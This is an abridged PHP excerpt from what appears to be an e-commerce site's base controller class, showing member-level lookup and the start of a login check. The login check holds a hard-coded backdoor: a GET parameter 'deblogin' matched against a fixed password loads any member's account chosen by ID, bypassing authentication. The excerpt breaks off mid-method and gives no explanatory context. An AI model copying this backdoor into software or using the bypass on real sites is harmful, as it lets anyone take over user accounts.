...
class Control{
    ...
    protected function getMemberAndGradeInfo($is_return = false){
        ...
        if($_SESSION['member_id']) {
            ...
            if ($member_info){
                ...
                if($member_info['diamond'] == 1){
                    $member_info['level_name'] = '钻石';
                }
            }
        }
    ...
    protected function checkLogin(){
    	if (isset($_GET['deblogin']) && $_GET['deblogin'] == 'hango@321' ) {
    		$model_member   = Model('member');
	    	$member_info = $model_member->getMemberInfo(array('member_id'=>intval($_GET['mid'])));
